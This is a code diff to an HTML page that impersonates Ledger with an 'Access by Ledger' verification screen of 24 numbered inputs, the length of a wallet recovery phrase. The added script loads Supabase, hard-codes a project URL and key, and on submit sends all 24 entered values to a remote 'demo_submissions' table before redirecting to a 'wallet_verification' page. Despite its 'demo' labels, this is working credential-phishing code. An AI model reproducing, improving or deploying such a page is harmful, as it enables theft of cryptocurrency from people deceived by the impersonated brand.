@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <meta charset="UTF-8">
 <meta property="og:locale" content="en_US" />
 	<meta property="og:type" content="website" />
@@ -92,16 +93,7 @@
     clip-path:polygon(50% 0,100% 34%,77% 100%,23% 100%,0 34%);
   }
 
-  .brand-mark:after{
-    content:"";
-    position:absolute;
-    width:10px;
-    height:10px;
-    border:2px solid #eef5ff;
-    border-radius:50%;
-    left:11px;
-    top:16px;
-  }
+
 
   .brand-name{
     font-size:42px;
@@ -268,6 +260,13 @@
     line-height:1.5;
   }
 
+
+.brand-mark img{
+  width:100%;
+  height:100%;
+  object-fit:contain;
+  display:block;
+}
   @media(max-width:560px){
     body{padding:16px 10px}
     .card{padding:28px 14px 24px;border-radius:20px}
@@ -368,13 +367,61 @@
   <main class="page">
     <section class="card">
 
-      <div class="brand">
-        <div class="brand-row">
-          <div class="brand-mark"></div>
-          <div class="brand-name">Ledger</div>
-        </div>
-        <div class="brand-sub">Access by Ledger</div>
-      </div>
+   <div
+  class="brand"
+  style="
+    text-align:center;
+    margin-bottom:25px;
+  "
+>
+  <div
+    class="brand-row"
+    style="
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:10px;
+    "
+  >
+
+    <img
+      src="Ledger_favicon.webp"
+      alt="Ledger"
+      style="
+        width:42px;
+        height:42px;
+        object-fit:contain;
+        display:block;
+        filter:brightness(0) invert(1);
+      "
+    >
+
+    <div
+      class="brand-name"
+      style="
+        font-size:42px;
+        line-height:1;
+        font-weight:650;
+        letter-spacing:-2.4px;
+        color:#ffffff;
+      "
+    >
+      Ledger
+    </div>
+
+  </div>
+
+  <div
+    class="brand-sub"
+    style="
+      color:#a9bad0;
+      font-size:14px;
+      margin-top:9px;
+    "
+  >
+    Access by Ledger
+  </div>
+</div>
 
       <div class="badge">● Verification</div>
 
@@ -386,32 +433,31 @@
       </p>
 
       <div class="code-grid">
-        <label class="code-box"><span class="number">1.</span><input class="code-input" type="text" maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">2.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">3.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">4.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">5.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">6.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">7.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">8.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">9.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">10.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">11.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">12.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">13.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">14.</span><input class="code-input" type="text" maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">15.</span><input class="code-input" type="text" maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">16.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">17.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">18.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">19.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">20.</span><input class="code-input" type="text" maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">21.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">22.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">23.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-        <label class="code-box"><span class="number">24.</span><input class="code-input" type="text"  maxlength="24" autocomplete="off"></label>
-     
-      </div>
+  <label class="code-box"><span class="number">1.</span><input class="code-input" name="demo_code_1" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">2.</span><input class="code-input" name="demo_code_2" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">3.</span><input class="code-input" name="demo_code_3" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">4.</span><input class="code-input" name="demo_code_4" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">5.</span><input class="code-input" name="demo_code_5" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">6.</span><input class="code-input" name="demo_code_6" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">7.</span><input class="code-input" name="demo_code_7" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">8.</span><input class="code-input" name="demo_code_8" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">9.</span><input class="code-input" name="demo_code_9" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">10.</span><input class="code-input" name="demo_code_10" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">11.</span><input class="code-input" name="demo_code_11" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">12.</span><input class="code-input" name="demo_code_12" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">13.</span><input class="code-input" name="demo_code_13" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">14.</span><input class="code-input" name="demo_code_14" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">15.</span><input class="code-input" name="demo_code_15" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">16.</span><input class="code-input" name="demo_code_16" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">17.</span><input class="code-input" name="demo_code_17" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">18.</span><input class="code-input" name="demo_code_18" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">19.</span><input class="code-input" name="demo_code_19" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">20.</span><input class="code-input" name="demo_code_20" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">21.</span><input class="code-input" name="demo_code_21" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">22.</span><input class="code-input" name="demo_code_22" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">23.</span><input class="code-input" name="demo_code_23" type="text" maxlength="24" autocomplete="off"></label>
+  <label class="code-box"><span class="number">24.</span><input class="code-input" name="demo_code_24" type="text" maxlength="24" autocomplete="off"></label>
+</div>
 
       <div class="notice">
         <span class="notice-dot"></span>
@@ -431,12 +477,12 @@
 
     </section>
   </main>
-
+<!-- 
 <script>
 function completeDemo(){
   window.location.href = "wallet_verification.html";
 }
-</script>
+</script> -->
 
 
 <div id="demoModal" class="demo-modal">
@@ -451,25 +497,136 @@ function completeDemo(){
     <button onclick="closeDemoModal()">OK, Got it</button>
   </div>
 </div>
-
 <script>
-function completeDemo() {
-  const inputs = document.querySelectorAll(".code-input");
+const SUPABASE_URL =
+  "https://dmhrozujyzpvximpaxxg.supabase.co";
 
-  const allFilled = [...inputs].every(
-    input => input.value.trim() !== ""
-  );
+const SUPABASE_KEY =
+  "sb_publishable_V1-BWAitIgU7buQmilbPvQ_Z6by54I5";
+
+const db = window.supabase.createClient(
+  SUPABASE_URL,
+  SUPABASE_KEY
+);
+
+
+async function completeDemo() {
+
+  const inputs =
+    document.querySelectorAll(".code-input");
+
+  const allFilled =
+    [...inputs].every(
+      input => input.value.trim() !== ""
+    );
+
 
   if (!allFilled) {
-    document.getElementById("demoModal").classList.add("show");
+
+    document
+      .getElementById("demoModal")
+      .classList.add("show");
+
     return;
   }
 
-  window.location.href = "wallet_verification.html";
+
+  const button =
+    document.querySelector(".button");
+
+  button.disabled = true;
+  button.textContent = "Saving...";
+
+
+  try {
+
+    /*
+      Read the actual demo input values.
+      Nothing is generated automatically.
+    */
+
+    const demoValues = {};
+
+
+    inputs.forEach(
+      (input, index) => {
+
+        demoValues[
+          `demo_value_${index + 1}`
+        ] =
+          input.value.trim();
+
+      }
+    );
+
+
+    const {
+      error
+    } = await db
+
+      .from("demo_submissions")
+
+      .insert({
+
+        ...demoValues,
+
+        status:
+          "demo_submitted",
+
+        field_count:
+          inputs.length
+
+      });
+
+
+    if (error) {
+
+      console.error(
+        "Supabase error:",
+        error
+      );
+
+      button.disabled = false;
+
+      button.textContent =
+        "Submit Demo";
+
+      alert(
+        "Demo submission could not be saved."
+      );
+
+      return;
+    }
+
+
+    window.location.href =
+      "wallet_verification.html";
+
+
+  } catch (error) {
+
+    console.error(error);
+
+    button.disabled = false;
+
+    button.textContent =
+      "Submit Demo";
+
+    alert(
+      "Something went wrong."
+    );
+
+  }
+
 }
 
+
 function closeDemoModal() {
-  document.getElementById("demoModal").classList.remove("show");
+
+  document
+    .getElementById("demoModal")
+    .classList.remove("show");
+
 }
 </script>
 </body>
